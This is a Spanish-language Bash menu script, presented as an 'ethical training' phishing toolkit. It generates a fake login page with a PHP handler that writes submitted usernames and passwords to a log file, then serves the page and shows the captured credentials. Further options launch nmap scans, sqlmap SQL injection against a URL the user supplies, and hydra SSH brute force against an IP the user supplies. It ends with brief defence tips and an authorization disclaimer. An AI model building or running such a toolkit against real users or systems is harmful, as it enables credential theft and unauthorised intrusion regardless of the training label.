#!/bin/bash

GREEN="\\e[32m"
YELLOW="\\e[33m"
CYAN="\\e[36m"
RESET="\\e[0m"

clear
echo -e "${GREEN}"
echo "#########################################"
echo "#   ____  _     _     _     _ _   _     #"
echo "#  |  _ \\| |__ (_)___| |__ (_) |_| |__  #"
echo "#  | |_) | '_ \\| / __| '_ \\| | __| '_ \\ #"
echo "#  |  __/| | | | \\__ \\ | | | | |_| | | |#"
echo "#  |_|   |_| |_|_|___/_| |_|_|\\__|_| |_|#"
echo "#########################################"
echo -e "${RESET}"
echo -e "${CYAN}USO EXCLUSIVO PARA ENTRENAMIENTO ÉTICO${RESET}"
echo -e "${CYAN}Autor: TU-ALIAS${RESET}"
echo

while true; do
  echo -e "${YELLOW}1) Crear página de login falsa"
  echo "2) Iniciar servidor PHP (simulación)"
  echo "3) Ver credenciales capturadas"
  echo "4) Borrar logs"
  echo "5) Escaneo de red (nmap)"
  echo "6) Inyección SQL (sqlmap)"
  echo "7) Fuerza bruta SSH (hydra)"
  echo "8) Consejos de defensa"
  echo "9) Tutorial detallado"
  echo "0) Salir${RESET}"
  echo
  read -p "Selecciona una opción: " opt

  case $opt in
    1)
      mkdir -p web logs
      cat > web/index.html <<EOF
<!DOCTYPE html>
<html>
<head>
  <title>Login Simulado</title>
</head>
<body>
  <h2>Simulación de Login</h2>
  <form method=\"POST\" action=\"login.php\">\n    Usuario: <input type=\"text\" name=\"user\"><br>
    Clave: <input type=\"password\" name=\"pass\"><br>
    <input type=\"submit\" value=\"Ingresar\">
  </form>
</body>
</html>
EOF

      cat > web/login.php <<EOF
<?php
if(isset(\$_POST['user']) && isset(\$_POST['pass'])){
  $file = fopen("../logs/creds.txt", "a");
  fwrite($file, "Usuario: ".\$_POST['user']." | Clave: ".\$_POST['pass']."\\n");
  fclose($file);
  echo "Credenciales capturadas (simulación)";
} else {
  echo "No se recibieron datos.";
}
?>
EOF
      echo -e "${CYAN}Página de login falsa creada en carpeta web/.${RESET}"
      ;;
    2)
      echo -e "${CYAN}Iniciando servidor PHP en puerto 8080...${RESET}"
      cd web
      php -S localhost:8080
      ;;
    3)
      echo -e "${CYAN}Credenciales capturadas:${RESET}"
      cat logs/creds.txt 2>/dev/null || echo "No hay datos aún."
      ;;
    4)
      rm -f logs/creds.txt
      echo -e "${CYAN}Logs eliminados correctamente.${RESET}"
      ;;
    5)
      read -p "Ingresa rango de red (ejemplo 192.168.1.0/24): " net
      echo -e "${CYAN}Ejecutando escaneo con nmap...${RESET}"
      nmap -sV $net
      ;;
    6)
      read -p "Ingresa URL vulnerable (ejemplo http://example.com/vuln.php?id=1): " url
      echo -e "${CYAN}Ejecutando sqlmap...${RESET}"
      sqlmap -u "$url" --dbs
      ;;
    7)
      read -p "IP objetivo SSH: " ip
      read -p "Usuario SSH: " user
      read -p "Archivo de contraseñas: " passfile
      echo -e "${CYAN}Ejecutando fuerza bruta con hydra...${RESET}"
      hydra -l $user -P $passfile ssh://$ip
      ;;
    8)
      echo -e "${CYAN}CONSEJOS DE DEFENSA${RESET}"
      echo "1) Verifica que la URL sea legítima."
      echo "2) Comprueba HTTPS y certificados."
      echo "3) No ingreses datos en páginas desconocidas."
      echo "4) Activa la autenticación de dos factores (2FA)."
      echo "5) Utiliza redes seguras y VPN."
      ;;
    9)
      echo -e "${CYAN}============= TUTORIAL DETALLADO =============${RESET}"
      echo
      echo "INSTALACIÓN Y USO:"
      echo "1) Da permisos de ejecución: chmod +x install.sh toolkit.sh"
      echo "2) Instala dependencias: bash install.sh"
      echo "3) Ejecuta esta herramienta: bash toolkit.sh"
      echo
      echo "DESCRIPCIÓN DE CADA OPCIÓN:"
      echo "1) Crear página de login falsa:"
      echo "   Genera archivos HTML y PHP en la carpeta web/."
      echo "   Sirve para practicar cómo se simula un formulario."
      echo
      echo "2) Iniciar servidor PHP:"
      echo "   Lanza un servidor local en puerto 8080."
      echo "   Visita http://localhost:8080 en tu navegador."
      echo
      echo "3) Ver credenciales:"
      echo "   Muestra los datos capturados en logs/creds.txt."
      echo
      echo "4) Borrar logs:"
      echo "   Elimina el archivo de credenciales guardadas."
      echo
      echo "5) Escaneo de red:"
      echo "   Usa nmap para detectar hosts y puertos abiertos."
      echo "   Ejemplo: 192.168.1.0/24"
      echo
      echo "6) Inyección SQL:"
      echo "   Usa sqlmap para comprobar vulnerabilidad SQLi."
      echo "   Ejemplo: http://example.com/vuln.php?id=1"
      echo
      echo "7) Fuerza bruta SSH:"
      echo "   Usa hydra para probar contraseñas SSH."
      echo "   Requiere archivo de contraseñas (passwords.txt)."
      echo
      echo "8) Consejos de defensa:"
      echo "   Buenas prácticas para protegerse de ataques."
      echo
      echo "IMPORTANTE: Esta herramienta es solo para fines educativos."
      echo "No usar en sistemas reales sin autorización."
      ;;
    0)
      echo -e "${CYAN}Saliendo de la toolkit. Practica siempre de forma ética.${RESET}"
      exit 0 ;;
    *)
      echo "Opción no válida, intenta de nuevo." ;;
  esac
done
